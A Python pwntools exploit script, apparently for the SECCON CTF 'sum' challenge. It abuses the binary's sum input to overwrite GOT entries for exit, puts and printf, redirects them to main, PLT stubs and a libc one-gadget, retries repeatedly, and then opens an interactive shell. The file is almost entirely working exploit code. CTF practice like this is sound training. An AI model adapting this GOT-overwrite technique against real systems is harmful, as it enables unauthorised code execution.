#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./sum"

rhp1 = {"host":"sum.chal.seccon.jp","port":10001}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF("./libc.so")

onegadgets = [0x4f2c5,0x4f322,0x10a38c]
main_addr = 0x40095e
start_addr = 0x40067f
main2 = 0x40093a
main3 = 0x400903

retry_count = 0

def exploit(conn):
  for k in libc.functions.keys():
    print(k+": "+hex(libc.functions[k].address))
  raw_input()

  global retry_count
  retry_count += 1
  print("TRY: "+hex(retry_count))

  exit_off = libc.functions["exit"].address
  printf_off = libc.functions["printf"].address
  puts_off = libc.functions["puts"].address
  alarm_off = libc.functions["alarm"].address
  setvbuf_off = libc.functions["setvbuf"].address
  print("[+]gadget off: "+hex(onegadgets[1]))
  print("[+]puts off: "+hex(puts_off))
  diff_printf_gadget = onegadgets[0]-printf_off
  diff_exit_gadget = onegadgets[0]-exit_off
  print("[+]exit offset: "+hex(exit_off))
  print("[+]alarm offset: "+hex(alarm_off))
  print("[+]printf offset: "+hex(printf_off))
  print("[+]setvbuf offset: "+hex(setvbuf_off))
  print("[+]diff onegadgets & libc exit: "+hex(diff_exit_gadget))
  print("[+]diff onegadgets & libc printf: "+hex(diff_printf_gadget))
  conn.recvuntil("0\n")
  conn.sendline("1 1 1 1 "+str(main3 -(0x4+binf.got["exit"]))+" "+str(binf.got["exit"]))

  ##
  conn.recvuntil("0")
  conn.sendline("1 1 1 1 "+str((binf.plt["printf"]+6) -(0x4+binf.got["puts"]))+" "+str(binf.got["puts"]))
  #conn.sendline("1 1 1 1 "+str((diff_printf_gadget)<<(8*6)-(0x4+binf.got["printf"]-0x6))+" "+str(binf.got["printf"]-0x6))

  #conn.recvuntil("0")
  #conn.sendline("1 1 1 1 "+str((binf.plt["printf"]+6) -(0x4+binf.got["puts"]))+" "+str(binf.got["puts"]))
  
  conn.recvuntil("0")
  conn.sendline("1 1 1 1 "+str((binf.plt["__isoc99_scanf"]+6) -(0x4+binf.got["puts"]))+" "+str(binf.got["puts"]))

  conn.recvuntil("0")
  a = 0xfca25<<(8*5)
  b = (binf.got["printf"]-5)
  conn.sendline("1 1 1 1 "+str(a-b-4)+" "+str(b))

  #
  conn.recvuntil("0")
  conn.sendline("3 3 0")
  conn.recvrepeat()
  

  #retry
  if retry_count > 0x200:
    print("NOT FOUND.........")
    return
  conn = remote(rhp2["host"],rhp2["port"])
  exploit(conn)



if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

